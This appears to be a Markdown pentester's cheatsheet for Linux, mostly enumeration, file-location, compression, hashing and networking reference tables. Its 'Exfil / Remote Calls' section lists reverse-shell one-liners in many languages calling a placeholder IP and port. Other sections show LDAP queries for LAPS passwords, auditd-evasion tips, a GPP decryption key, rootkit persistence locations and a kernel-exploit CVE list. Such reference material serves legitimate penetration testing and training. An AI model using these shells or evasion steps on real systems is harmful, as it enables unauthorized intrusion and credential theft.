Linux Cheatsheet for Pentesters
===============================
Key:
- `*` - Indicates non-portable/non-POSIX/shell built-in
- `#` - Indicates root priveleges are normally needed
 
Linux does not have a standarized userspace, this means that commands on different distributions of Linux do not have the same tools. For example, RHEL based distros are replacing `ifconfig`, `arp`, `netstat`, `route`, and more with a single command `ss` and you may not find these tools on the latest versions of some distros. Some tools you might expect in Ubuntu may not exist on Gentoo. An overview table of some distros configuration can be seen in the "Distribution Cheatsheet" section.

Information Gathering
---------------------
- `uname -a` - prints the OS information: `Linux rapid7 4.14.0-kali3-amd64 #1 SMP Debian 4.14.17-1kali1 (2018-02-16) x86_64 GNU/Linux`
- `id` - user and group IDs and the corresponding user and group: `uid=1000(cale) gid=1000(cale) groups=1000(cale),27(sudo)`
- `df` - List filesystem mount points. 
- `mount`\* - list mounted filesystem, check for world writable or writable by user (VMWare for instance mounts with vulnerable permissions)
- `last`\* - print the last logged in users and the time they logged in.
- `env` - print environment variables.
- `history`\* - print shell history.
- `lsof`\* - list open files

Sensitive Locations
-------------------
- `/etc/` - common configurations 
- `/var/log/` - system logs
- `$HOME/.bash_history` - bash history
- `$HOME/.sh_history` - sh history
- `$HOME/.zsh_history` - zsh history
- `$HOME/.bashrc` - bash rc init file
- `$HOME/.profile` - shell profile

Permissions
-----------
- `find / -type f -perm -o+w` - find world writable files, use `-type d` and use `2>/dev/null` to remove permission denied errors
- `find / -nouser -nogroup` - find files without owner or group
- `find / -perm /4000 ` - find SUID files
- `find / -perm /2000` - find SGID executables/folders
- `find / -type f -perm /0100` - find executable all binaries

Non-interactive Shell Tricks
----------------------------
- `2>&1` - get STDERR output (ie for --help output)
- `python -c 'import pty; pty.spawn("/bin/sh")'` - full TTY spaws for job control and more normal shell features
- `perl —e 'exec "/bin/sh";'` - full TTY via perl
- `/bin/sh -i` - full interactive TTY
- `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.13.37.3:7776` - socat full TTY, connecting to server running: `socat file:\`tty\`,raw,echo=0 tcp-listen:7776`
- Create matching TTY sessions between current terminal and remote terminal. On compromised client run `export TERM=xterm-256color`, background shell `CTRL-Z`, set local shell `stty raw -echo`, foreground shell `fg`, and reset the TTY columns/rows `reset`

Exfil / Remote Calls
--------------------
- openssl:

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -CAfile /tmp/cert.pem -verify_return_error -verify 1 -connect $IP:$PORT > /tmp/s; rm /tmp/s
```
- awk/gawk: 

```
awk 'BEGIN {s = "/inet/tcp/0/$IP/$PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
- bash: 

```
bash -i >& /dev/tcp/$IP/$PORT 0>&1
```
- ksh: 

```
ksh -c 'ksh >/dev/tcp/IP/PORT 2>&1 <&1'
```
-  bash + telnet + ssl: 

```
mkfifo a && telnet -z verify=0 IP PORT 0<a | $(which $0) 1>a & sleep 10 && rm a &
```
- nc: 

```
/bin/sh | nc IP PORT
```
- nc -e: 

```
nc -e /bin/sh IP PORT
```
- nodejs: 

```
(function(){ var net = require("net"), cp = require("child_process"),sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(PORT, "IP", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```
- perl: 

```
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- php: 

```
php -r '$sock=fsockopen("IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- ruby: 

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
- python: 

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- R: 

```
R -e "s<-socketConnection(host='IP',port=PORT,blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines(pipe(readLines(s, 1))),s)}"
```
- socat: 

```
socat tcp-connect:IP:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane
```
- lua: 

```
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('IP',PORT;while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
```
- zsh: 

```
zsh -c 'zmodload zsh/net/tcp && ztcp IP PORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

IO Redirection
--------------
- `>` - Redirect standard out (STDOUT), truncates
- `>>` - Redirect STDOUT and appends
- `1>` - Redirect standard out (STDOUT), truncates
- `1>>` - Redirect STDOUT and appends
- `2>` - Redirect error messages (STDERR)
- `M>&N` - Redirect file descriptor M to N (for example 2>&1 will redirect STDERR to STDOUT to unify output)

Networking
----------
| what do                | traditional     | "new" style |
| ---------------------- | --------------- | ----------- |
| list listening ports\* | `netstat -ltnu` | `ss -tlu`   |
| list listening ports w/ process\*\# | `netstat -ltnup` | `ss -tlup`   |
| list interfaces\* | `ifconfig -a` | `ip link`   |
| list interface ips\* | `ifconfig -a` | `ip addr`   |
| list routing table\* | `route -n` | `ip route`   |
| arp table\* | `arp` | `ip neigh`   |
| active connections\* | `netstat -natp` | `ss -ta`   |
| find hostname\* | `hostname` | `hostname`   |
| find DNS resolver\* | `cat /etc/resolv.conf` | `cat /etc/resolv.conf`   |

Distribution Cheatsheet
-----------------------
| Distro               | Package Manager     | Distro Specific |
| -------------------- | --------------- | ----------- |
| Debian | `apt-get` | `/etc/os-release` `/etc/apt/`  |
| Ubuntu | `apt-get` |  `/etc/apt/`  |
| RHEL | `yum` |    |
| Fedora | `yum`/`dnf` |    |
| CentOS | `yum` |    |
| SUSE | `zypper` |    |
| Arch | `pacman` | `/etc/pacman/` |
| Gentoo | `emerge` |    |
| OpenWRT / LEDE | `opkg` |    |
| Alpine | `apk` |    |

Centralized Authentication (LDAP/NIS/Kerberos)
----------------------------------------------
* `getent`
  * `getent passwd`
  * `getent shadow`
  * `getent hosts`
* ldap:
  * `ldapsearch`
  * LAPS passwords: `ldapsearch -x -h 10.13.37.2 -D "sqladmin" -w Summer18 -b "dc=DC,dc=EXAMPLE,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
  * Get Domain Admin users: `ldapsearch -x -h 10.13.37.2 -D "sqladmin" -w Summer18 -b "dc=DC,dc=EXAMPLE,dc=COM" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=DC,dc=EXAMPLE,dc=COM))'`
  * Get all Machines: `ldapsearch -x -h 10.13.37.2 -D "sqladmin" -w Summer18 -b "dc=DC,dc=EXAMPLE,dc=COM" -s sub "(objectCategory=computer)"`
* kerberos:
  * Create `/etc/krb5.conf` with:
  
 ```
 [libdefaults]
    default_realm = EXAMPLE.COM

[realms]
    EXAMPLE.COM = {
            kdc = dc.example.net:88
    }

[domain_realm]
    .example.com = EXAMPLE.COM
    example.com = EXAMPLE.COM
 ```
  * Init tickets: `kinit cblack@EXAMPLE.COM`
  * List ticket: `klist -v`
  * Mount kerberized servie: `mount -t nfs4 -o sec=krb5 NFS.EXAMPLE.COM:/ /mnt`

Evasive Commands
----------------
System commands can be audited and if `auditd` is running. Check if `/var/log/audit/` exists. If so use these to evade common anomoly detection instead of the normal commands, by default `auditd` logs calls to processes that `execve()`. Sticking to `cat` and other simple commands will trigger less often than running `uname`.

- `/sys` - Kernel and system information is stored here
	* `/sys/class/dmi/id/product_name` - Detect virtualization from motherboard: `VMware Virtual Platform`
	* `/sys/class/net/*` - List of network devices
	* `/sys/class/net/*/type` - Type of networking device as defined in http://lxr.linux.no/linux+v3.0/include/linux/if_arp.h#L30
- `/dev/` - System devices, filesystems, and more.
	* `/dev/kmsg`\# - kernel messages (same a dmesg)
- `/boot/config*`\* - kernel boot configuration

Data Munging
------------
- `base64 -d secrets.txt.enc | grep -q 'Salted__'` - detect openssl enc encrypted files

Compression
-----------
- `tar xf file.tar`
- `tar xzf file.tar.gz`
- `tar xJf file.tar.xz`
- `tar xjf file.tar.bz2`
- `unzip file.zip`
- `gzip -c file > file.gz`
- `gzip file`
- `gzip -d file.gz`
- `gunzip file.gz`
- `bzip2 file` - bzip2 a file, removes original
- `bzip2 -c file > file.bz2` - bzip2 compress file and leave the original
- `xz file` - xz compress a file, removes original
- `xz -k file` - xz compress a file, keep original
- `xz -F lzma file` - LZMA compress a file, remove
- `xz -F lzma -k file` - LZMA compress a file, keep
- `unxz file.xz` - decompress xz file
- `unxz -F lzma file.lz` - decompress LZMA file
- `xzcat`, `zcat`, `bzcat` - cat compressed xz, gzip, and bzip2 files to STDOUT
- `xz -T 8 file` - compress xz with 8 threads
- `kill -SIGUSR1 86347` - send SIGUSR1 which will retrieve the status of gzip, xz, dd, and many more

Encoding
--------
- `echo 'a' | base64` - base64
- `echo 'YQo=' | base64 -d` - base64 decode
- `echo 'a' | base32` - base32
- `echo 'MEFA====' | base32 -d` - base32 decode
- `openssl x509 -in cert.crt -text` - x509 decoding
- `openssl pkcs12 -in cert.p12 -info` - PKCS#12 (.p12/.pfx) decoding
- `openssl rsa -in cert.priv -check` - ASN.1 SSL RSA cert decoding

Hashing
-------
- `sha512sum` - 128 chars
- `sha384sum` - 96 chars
- `sha256sum` - 64 chars
- `sha1sum` - 40 chars
- `md5sum` - 32 chars
- `$1$salt$hash` - MD5 crypt - 22 chars
- `$2a$salt$hash` - Blowfish crypt (not glibc) 
- `$2b$digits$hash` - bcrypt crypt (not glibc), $digits$ portion is the number of rounds and salts are included in bcrypt
- `$5$salt$hash` - SHA-256 crypt - 43 chars 
- `$6$salt$hash` - SHA-512 crypt - 86 chars 

Encryption
----------
- OpenSSL symmetric encryptin *DO NOT USE IN REAL LIFE, UNSAFE*: `openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc`
- GPP Decryption: `echo "$1" | openssl enc -aes-256-cbc -d -a -p -iv "" -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -nosalt;`

busybox
-------
Commonly found on embedded systems busybox can be compiled with the needed binaries functions and then symlinks (`ln -s`) are created that point to busybox. Busybox then enumerates the functions that are to be called based on the name of the symlink:
* `/bin/busybox ls` - Invoke `ls`
* `ln -s /bin/busybox ./ls` - Creates a symlink to busybox for ls and can be invoked with `./ls`
* `busybox --list` - List supported busybox functions (symlinks may not exist, but this will list supported functions)

Compilation
-----------
List of common compilers:
* `cc` - Often just a link to `/etc/alternatives/cc` which defines the default compiler
* `gcc`
* `clang`

User / Password Management
--------------------------
Just like with a lot of things user management. The main consistent files that exist on most systems are:

| File | Usage | Def. Perms | Format |
| ---- | ----- | ---------- | ------ |
| `/etc/passwd` | User account information | World readable | `login_name`:`password (optional)`:`UID`:`GID`:`comment`:`home_dir`:`shell/interpreter (optional)`|
| `/etc/group` | Group definitions | World readable | `group_name`:`password (optional)`:`GID`:`user_list` |
| `/etc/shadow` | Passwords and aging info | Root user/group readable | `login_name`:`hashed_password`:`last_passwd_change`:`min_passwd_age`:`max_passwd_age`:`passwd_warn_period`:`passwd_inactivity_period`:`expiration_date`:`reserved` |
| `/etc/shadow-` | Passwords and aging info (backup)| Root user/group readable | `login_name`:`hashed_password`:`last_passwd_change`:`min_passwd_age`:`max_passwd_age`:`passwd_warn_period`:`passwd_inactivity_period`:`expiration_date`:`reserved` |
| `/etc/login.defs` | Shadow configuration | World readable | Site specific configuration that contains password policies |
| `/etc/gshadow` | Group password info | Root user/group readable| `group_name`:`hashed_password`:`admins`:`members` |

If `/etc/passwd` or `/etc/group` files contain a `password` field they can be cracked. See hashing section.

Common commands for user management (these are not standardized and your mileage may vary):
* `passwd` - Change user password
* `chsh` - Change shell
* `usermod` - Modify user accounts
* `groupmod` - Modify group settings
* `useradd` - Add users
* `adduser` - Add user
* `userdel` - Delete users
* `groupadd` - Add groups
* `addgroup` - Add group
* `groupdel` - Delete groups

Additionally many configurations and remote access are managed by `pam.d(5)` which manages privilege granting and authorization. For example this is often where you can find configuration for 2FA:
| File | Function |  Notes |
| ---- | -------- |  ----- |
| `/etc/pam.conf` | Rules for services to handle privileges | Overriden by rules in `/etc/pam.d/*` |
| `/etc/pam.d/*` | Every file in here represents a configuration for the named service (ie sshd) | |
| `/lib/$ARCH-linux-gnu/security/*.so` | Common location for shared objects representing pam policies | Distro dependent, other locations are likely to exist |

Init Systems and Services
-------------------------

Identifying init system:
* `/proc/1/cmdline` - Generally all init systems are PID 1

Interacting with init systems / services

| Function | sysvinit | systemd | OpenRC | upstart | runit | 
| -------- | -------- | ------- | ------ | ------- | ----- |
| Interaction | Single config file | Config files (ini) | Shell scripts | Config files + shell scripts | Shell scripts |

Kernel Modules
--------------

| what do                | command     | location |
| ---------------------- | --------------- | ----------- |
| list kernel modules\* | `lsmod` | `/sys/module/`   |

Common Rootkit Techniques
-------------------------
* LD\_PRELOAD - `/etc/ld.so.preload`/`/etc/ld.so.conf`/`/etc/ld.so.conf.d/*` - hooks all dynamically linked functions
* Kernel modules - See "Kernel Modules"
* Init Systems - See "Init Systems"
* SUID/GUID binaries - Often used for privesc in combination with other techniques they can be hidden
* `/proc/sys/fs/binfmt_misc/*` - Default interpreters can be added here for support. It's common to apply rootkit interpreters here. 

Kernel Exploits
---------------
Stolen from (https://github.com/SecWiki/linux-kernel-exploits): 

CVE/Ref | Details
------- | ------- 
CVE–2018–1000001 | [glibc]  (glibc <= 2.26)  
CVE-2017-1000367 | [Sudo]  (Sudo 1.8.6p7 - 1.8.20)  
CVE-2017-1000112 | [a memory corruption due to UFO to non-UFO path switch]  
CVE-2017-16995 | [Memory corruption caused by BPF verifier]  (Linux kernel before 4.14 - 4.4)
CVE-2017-16939 | [UAF in Netlink socket subsystem – XFRM]  (Linux kernel before 4.13.11)
CVE-2017-7494 | [Samba Remote execution]  (Samba 3.5.0-4.6.4/4.5.10/4.4.14)  
CVE-2017-7308 | [a signedness issue in AF\_PACKET sockets]  (Linux kernel through 4.10.6)  
CVE-2017-6074 | [a double-free in DCCP protocol]  (Linux kernel through 4.9.11)  
CVE-2017-5123 | ['waitid()']  (Kernel 4.14.0-rc4+)  
CVE-2016-9793 | [a signedness issue with SO\_SNDBUFFORCE and SO\_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)  
CVE-2016-5195 | [Dirty cow]  (Linux kernel>2.6.22 (released in 2007))  
CVE-2016-2384 | [a double-free in USB MIDI driver]  (Linux kernel before 4.5)  
CVE-2016-0728 | [pp\_key]  (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)  
CVE-2015-7547 | [glibc getaddrinfo]  (before Glibc 2.9)  
CVE-2015-1328 | [overlayfs]  (3.13, 3.16.0, 3.19.0)  
CVE-2014-5284 | [OSSEC]  (2.8)  
CVE-2014-4699 | [ptrace]  (before 3.15.4)  
CVE-2014-4014 | [Local Privilege Escalation]  (before 3.14.8)  
CVE-2014-3153 | [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8 ,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)  
CVE-2014-0196 | [rawmodePTY]  (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)  
CVE-2014-0038 | [timeoutpwn]  (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)  
CVE-2013-2094 | [perf\_swevent]  (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4, 3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)  
CVE-2013-1858 | [clown-newuser]  (3.3-3.8)  
CVE-2013-1763 | [\_\_sock\_diag\_rcv\_msg]  (before 3.8.3)  
CVE-2013-0268 | [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)  
CVE-2012-3524 | [libdbus]  (libdbus 1.5.x and earlier)  
CVE-2012-0056 | [memodipper]  (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)  
CVE-2010-4347 | [american-sign-language]  (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)  
CVE-2010-4258 | [full-nelson]  (2.6.31, 2.6.32, 2.6.35, 2.6.37)  
CVE-2010-4073 | [half\_nelson]  (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)  
CVE-2010-3904 | [rds]  (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)  
CVE-2010-3437 | [pktcdvd]  (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)  
CVE-2010-3301 | [ptrace\_kmod2]  (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)  
CVE-2010-3081 | [video4linux]  (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)  
CVE-2010-2959 | [can\_bcm]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)  
CVE-2010-1146 | [reiserfs]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)  
CVE-2010-0415 | [do\_pages\_move]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)  
CVE-2009-3547 | [pipe.c\_32bit]  (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)  
CVE-2009-2698 | [udp\_sendmsg\_32bit]  (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)  
CVE-2009-2692 | [sock\_sendpage]  (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)  
CVE-2009-2692 | [sock\_sendpage2]  (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)  
CVE-2009-1337 | [exit\_notify]  (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)  
CVE-2009-1185 | [udev]  (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)  
CVE-2008-4210 | [ftrex]  (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22)  
CVE-2008-0600 | [vmsplice2]  (2.6.23, 2.6.24)  
CVE-2008-0600 | [vmsplice1]  (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)  
CVE-2006-3626 | [h00lyshit]  (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)  
CVE-2006-2451 | [raptor\_prctl]  (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)  
CVE-2005-0736 | [krad3]  (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)  
CVE-2005-1263 | [binfmt\_elf.c]  (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)  
CVE-2004-1235 | [elflbl]  (2.4.29)  
CVE-N/A | [caps\_to\_root]  (2.6.34, 2.6.35, 2.6.36)  
CVE-2004-0077 | [mremap\_pte]  (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)  
